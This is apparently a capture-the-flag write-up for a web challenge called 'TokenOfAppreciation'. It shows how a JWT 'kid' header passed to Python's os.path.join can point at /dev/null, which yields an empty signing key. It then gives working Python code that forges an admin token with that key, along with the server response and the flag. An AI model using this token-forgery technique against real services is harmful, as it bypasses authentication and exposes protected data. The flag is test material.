---
title: "TokenOfAppreciation"
ctf: "CyberStrike"
date: 2026-07-10
category: web
difficulty: medium
points: 250
flag_format: "cyberstrike{...}"
author: "retr0"
---

# TokenOfAppreciation

## Summary

A rewards portal ("Nexus Identity") issues HS256 JWTs with a hardcoded `guest` role and gates an admin audit endpoint behind `role: admin`. A legacy V1 federation mode loads JWT signing keys from a vault directory using `os.path.join(vault_dir, kid)`. Python's `os.path.join` discards the prefix when the second argument is an absolute path, so setting `kid = "/dev/null"` loads an **empty key**. Forging an admin token with that empty key bypasses signature verification and reveals the flag.

## Solution

### Step 1: Recon — find the legacy key-loading path

- `robots.txt` disallows `/tenant-portal`; a footer HTML comment references `/docs/migration`.
- `/docs/migration` documents the V1 compatibility layer: enable it with `X-Legacy-Routing: v1` + `X-Partner-ID`, and the JWT `kid` header must match a key filename in the partner vault (e.g. `partner_1.key`).
- `/api/login` returns HS256 JWTs but hardcodes `role: "guest"`; `/api/admin/audit` returns `403 Forbidden: Admin role required` for guests.
- Probing `kid` values yields an oracle:
  - `kid=partner_1.key` → `"Signature verification failed"` (key file **exists**, wrong signature)
  - `kid=partner_1` → `"Partner key 'partner_1' not found or blocked"` (file missing)
  - `kid=/dev/null` → `"Signature verification failed"` (file resolved — empty contents)

The last case is the seam: `os.path.join("/vault", "/dev/null")` evaluates to `"/dev/null"`, loading an **empty HMAC key**. Relative `..` traversal is blocked, but absolute paths bypass the vault prefix entirely.

### Step 2: Forge an admin token signed with the empty key

```python
import base64, json, hmac, hashlib, time, requests

BASE = "http://chal.csc-snist.live:39215"

def b64(d):
    if isinstance(d, str):
        d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

# Forged admin payload, signed with the empty key that /dev/null yields
now = int(time.time())
payload = {"user": "admin", "role": "admin", "iat": now, "exp": now + 3600}
header = {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}

h = b64(json.dumps(header, separators=(",", ":")))
p = b64(json.dumps(payload, separators=(",", ":")))
sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
token = f"{h}.{p}.{b64(sig)}"

# Hit the admin audit endpoint via legacy V1 mode
r = requests.get(f"{BASE}/api/admin/audit", headers={
    "Authorization": f"Bearer {token}",
    "X-Legacy-Routing": "v1",
    "X-Partner-ID": "partner_1",
    "X-Debug-Mode": "1",
})
print(r.status_code, r.text)
```

Output:

```
200 {"audit_logs":[{"event":"System start","timestamp":"2026-04-20T08:00:00Z"},{"data":"Secret material: cyberstrike{t0k3n_0f_appr3c1at10n_py_j01n_quirk_1337}","event":"Flag accessed","timestamp":"2026-04-20T10:30:00Z"}],"status":"success"}
```

## Flag

```
cyberstrike{t0k3n_0f_appr3c1at10n_py_j01n_quirk_1337}
```
